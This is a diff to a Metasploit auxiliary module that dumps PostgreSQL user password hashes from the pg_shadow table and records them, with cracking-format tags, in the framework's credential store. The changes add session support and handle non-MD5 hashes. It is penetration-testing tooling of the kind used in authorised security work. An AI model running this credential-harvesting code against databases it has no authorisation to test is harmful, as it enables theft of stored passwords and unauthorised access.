@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Postgres
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
+  include Msf::OptionalSession::PostgreSQL
 
   def initialize
     super(
@@ -18,21 +19,31 @@ class MetasploitModule < Msf::Auxiliary
       'Author'         => ['theLightCosine'],
       'License'        => MSF_LICENSE
     )
-    register_options([
-      OptString.new('DATABASE', [ true, 'The database to authenticate against', 'postgres']),
-      ])
     deregister_options('SQL', 'RETURN_ROWSET', 'VERBOSE')
 
   end
 
-  def run_host(ip)
+  def username
+    session ? session.client.params['username'] : datastore['USERNAME']
+  end
 
+  def database
+    session ? session.client.params['database'] : datastore['DATABASE']
+  end
+
+  def password
+    # The session or its client doesn't store the password
+    session ? nil : datastore['PASSWORD']
+  end
+
+  def run_host(ip)
+    self.postgres_conn = session.client if session
     # Query the Postgres Shadow table for username and password hashes and report them
     res = postgres_query('SELECT usename, passwd FROM pg_shadow',false)
 
     service_data = {
-        address: ip,
-        port: rport,
+        address: postgres_conn.peerhost,
+        port: postgres_conn.peerport,
         service_name: 'postgres',
         protocol: 'tcp',
         workspace_id: myworkspace_id
@@ -41,11 +52,11 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
         module_fullname: self.fullname,
         origin_type: :service,
-        private_data: datastore['PASSWORD'],
+        private_data: password,
         private_type: :password,
-        username: datastore['USERNAME'],
+        username: username,
         realm_key:  Metasploit::Model::Realm::Key::POSTGRESQL_DATABASE,
-        realm_value: datastore['DATABASE']
+        realm_value: database
     }
 
     credential_data.merge!(service_data)
@@ -68,10 +79,10 @@ class MetasploitModule < Msf::Auxiliary
 
       case res[:sql_error]
       when /^C42501/
-        print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - Insufficient permissions."
+        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - Insufficient permissions."
         return
       else
-        print_error "#{datastore['RHOST']}:#{datastore['RPORT']} Postgres - #{res[:sql_error]}"
+        print_error "#{postgres_conn.peerhost}:#{postgres_conn.peerport} Postgres - #{res[:sql_error]}"
         return
       end
     when :complete
@@ -96,30 +107,34 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     service_data = {
-        address: ::Rex::Socket.getaddress(rhost,true),
-        port: rport,
+        address: postgres_conn.peerhost,
+        port: postgres_conn.peerport,
         service_name: 'postgres',
         protocol: 'tcp',
         workspace_id: myworkspace_id
     }
 
-    credential_data = {
-        origin_type: :service,
-        jtr_format: 'raw-md5,postgres',
-        module_fullname: self.fullname,
-        private_type: :postgres_md5
-    }
-
-    credential_data.merge!(service_data)
-
-
     res[:complete].rows.each do |row|
       next if row[0].nil? or row[1].nil?
       next if row[0].empty? or row[1].empty?
+
       password = row[1]
 
-      credential_data[:username]     = row[0]
-      credential_data[:private_data] = password
+      credential_data = {
+        origin_type: :service,
+        module_fullname: self.fullname,
+        private_data: password,
+        username: row[0]
+      }
+
+      if password.start_with?('md5')
+        credential_data[:private_type] = :postgres_md5
+        credential_data[:jtr_format] = 'raw-md5,postgres'
+      else
+        credential_data[:private_type] = :nonreplayable_hash
+      end
+
+      credential_data.merge!(service_data)
 
       credential_core = create_credential(credential_data)
       login_data = {
@@ -133,6 +148,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     print_good("#{tbl.to_s}")
 
+    postgres_logout if self.postgres_conn && session.blank?
   end
 
 end
